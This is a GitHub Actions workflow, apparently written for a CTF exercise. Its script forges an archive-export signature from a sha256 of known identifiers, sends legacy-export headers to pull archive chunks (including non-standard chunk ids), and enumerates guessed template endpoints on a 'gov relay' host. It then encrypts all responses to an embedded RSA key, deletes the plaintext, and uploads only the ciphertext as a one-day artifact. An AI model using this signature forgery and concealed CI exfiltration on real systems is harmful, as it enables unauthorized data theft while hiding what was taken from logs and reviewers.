name: cyberkomi-parma-blackbox-gov-templates

on:
  push:
    branches: [ctf-cyberkomi-probe-20260808]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 7
    steps:
      - name: Export intended PARMA chunks and inspect GOV template catalogue
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p out/parma out/gov handoff
          P='https://task-parma-line-ce3d96e598f7b9c1.caplag-task.ru'
          G='https://task-gov-relay-a90ea5f1999a03b4.caplag-task.ru'
          ARCH='BBX-P23-00'; SEED='PARMA-NIGHT-23'

          for cid in c04 c01 d09 c03 x17 c02; do
            sig=$(printf '%s' "$ARCH:$cid:$SEED" | sha256sum | cut -c1-16 | tr '[:lower:]' '[:upper:]')
            printf '{"archiveId":"%s","chunkId":"%s"}' "$ARCH" "$cid" > handoff/chunk.json
            curl -sS --connect-timeout 6 --max-time 25 \
              -H 'Content-Type: application/json' \
              -H 'X-Legacy-Export: 1' \
              -H "X-Archive-Signature: $sig" \
              --data-binary @handoff/chunk.json \
              -D "out/parma/chunk_${cid}.headers" -o "out/parma/chunk_${cid}.body" \
              "$P/api/archive/chunk" || true
          done

          # The observer role advertises viewing public templates. Probe only natural catalogue routes.
          for path in api/templates api/templates/public api/public/templates api/template api/broadcast/templates api/messages/templates; do
            safe=$(echo "$path" | tr '/' '_')
            curl -sS --connect-timeout 5 --max-time 20 -D "out/gov/${safe}.headers" -o "out/gov/${safe}.body" "$G/$path" || true
          done

          cat > handoff/output_public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqvptF4aTPzGzR6fNOtz3
          p/Ds9uFcANf/SCwSCWZEqbNmMGqmMYOexJISES2kjQJqiPoovpFrr4bawgr9zw7y
          sSxNcsP9lbuOdMKEU+tVS+2TebLPXMv4Ue8yX5ZhWdK3c9uz3RZHW8oWLTWgUBlC
          N7NDHSJDqeFJm4NFxBUYfVwYzxU2uD6m8r1B3FZrz/YGmMsMQFV5gWqTdiAmtosu
          uSxUJ1891V9Qd4URX4TGbkGGAE+aSSNF1WTykdECOSZmrspbu5C48489D94iaDyU
          4y+NlouCIV6/DGoJvd6VSp3SwZTTNShPQ2YKhnvRN75g7Sm++9RYeipo7xmrOBIZ
          bbyjuSC9Nd6Vy99R40e38UMAFzDUXKq5GjCBNMdA3VxrMSvs+LFeKQ77rB6h7EkX
          xVHeZPvwwV6lYUQ1i7DnLRLlz4mVqVGVa2hifx9VY2PM/M2c5/iA0uHEWQkxZ9F1
          YSb2e96Ws1+dS0tHu4hzArM8lZQEaHveFLsIu67isD0/AgMBAAE=
          -----END PUBLIC KEY-----
          PEM
          tar -C out -czf handoff/results.tar.gz .
          openssl rand 32 > handoff/key; openssl rand 16 > handoff/iv
          openssl enc -aes-256-ctr -K "$(xxd -p -c256 handoff/key)" -iv "$(xxd -p -c256 handoff/iv)" -in handoff/results.tar.gz -out handoff/results.enc
          cat handoff/key handoff/iv > handoff/keyblob
          openssl pkeyutl -encrypt -pubin -inkey handoff/output_public.pem -in handoff/keyblob -out handoff/keyblob.enc -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
          rm -rf out handoff/key handoff/iv handoff/keyblob handoff/results.tar.gz handoff/output_public.pem handoff/chunk.json
          echo 'Blackbox export and template catalogue probe complete; responses encrypted.'
      - name: Upload encrypted result
        uses: actions/upload-artifact@v4
        with:
          name: cyberkomi-blackbox-templates-encrypted
          path: |
            handoff/results.enc
            handoff/keyblob.enc
          retention-days: 1
